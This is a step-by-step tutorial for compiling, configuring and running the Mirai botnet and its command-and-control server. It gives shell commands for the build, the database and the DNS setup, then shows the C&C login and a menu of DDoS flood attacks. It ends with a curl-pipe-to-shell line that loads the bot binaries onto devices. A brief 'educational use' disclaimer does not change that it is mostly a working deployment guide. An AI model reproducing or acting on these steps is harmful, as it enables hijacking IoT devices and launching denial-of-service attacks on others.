# Mirai setup

## What you need:
- Working pihole setup
- Ubuntu / Debian based linux distribution (tested on elementary os)
- Copy of mirai source code

## What we will do
The goal is to setup and run mirai in an local environment.  
But a disclaimer at the beginning: Do not use this to actually attack somebody its only for educational use.
<br><br>

## Setup tools
### First we need to install some packages  

```
sudo apt install gcc golang electric-fence mysql-server mysql-client screen dialog python3 apache2 -y
```
<br>

### The next step is to install the cross compilers
```
sudo bash ./tools/compilers.sh
```
<br>

**Now please restart your bash for those changes to take effect**
<br>


### Now we can compile it for the first time :D
```
bash ./setup.sh
bash ./build.sh debug telnet
```
<br>

### Now we need to setup the database it's easy trust me.
Simply run:
```
cat ./tools/db.sql | sudo mysql
```
<br>

Now restart mysql to make sure all changes are loaded:
```
sudo systemctl restart mysql
```
<br>

### Now we need to change some settings.  
Simply run and type in your domain and dns server:
```
python3 setup.py
```
<br>

### Now we can compile it for the second time :D
```
bash ./build.sh debug telnet
```
<br>

### Now its time to setup pihole
To do this you need to login into pihole and go to Local DNS/DNS Records and type in the domain you used earlier in this tutorial and the ip of the server where the cnc is supposed to run on. **Don't forget to click on add!**
<br>

### And finlay we can run it!
To run the cnc use:
```
cd debug
screen -S mirai-cnc sudo ./cnc
```
<br>

To run a bot use:
```
cd debug
screen -S mirai-bot sudo ./mirai.dbg
```
<br>

To connect to the cnc using telnet use:
```
telnet localhost

You will be asked to login you can do that with the user we inserted earlier into the database it should look something like:

я люблю куриные наггетсы
пользователь: root
пароль: root

проверив счета... |
[+] DDOS | Succesfully hijacked connection
[+] DDOS | Masking connection from utmp+wtmp...
[+] DDOS | Hiding from netstat...
[+] DDOS | Removing all traces of LD_PRELOAD...
[+] DDOS | Wiping env libc.poison.so.1
[+] DDOS | Wiping env libc.poison.so.2
[+] DDOS | Wiping env libc.poison.so.3
[+] DDOS | Wiping env libc.poison.so.4
[+] DDOS | Setting up virtual terminal...
[!] Sharing access IS prohibited!
[!] Do NOT share your credentials!
Ready
root@botnet#
```
<br>

Finaly to see a list of attacks type:
```
root@botnet# ?
Available attack list
udp: UDP flood
dns: DNS resolver flood using the targets domain, input IP is ignored
stomp: TCP stomp flood
greip: GRE IP flood
greeth: GRE Ethernet flood
vse: Valve source engine specific flood
syn: SYN flood
ack: ACK flood
udpplain: UDP flood with less options. optimized for higher PPS
http: HTTP flood
```
<br>

### But wait there is more
We didn't see how to attack iot devices yet but first of all we need to compile the release binary's:
```
bash ./build.sh release telnet
```
<br>

Let's install the binary's to apache2:
```
cd release
sudo bash ../apache2.sh
```
<br>

Now lets run the cnc:
```
cd release
sudo screen -dmS mirai-cnc ./cnc
```
<br>

If you did everything right you can now load mirai onto a device with:
```
curl http://<your ip>/bins/bins.sh |sh
```
<br>
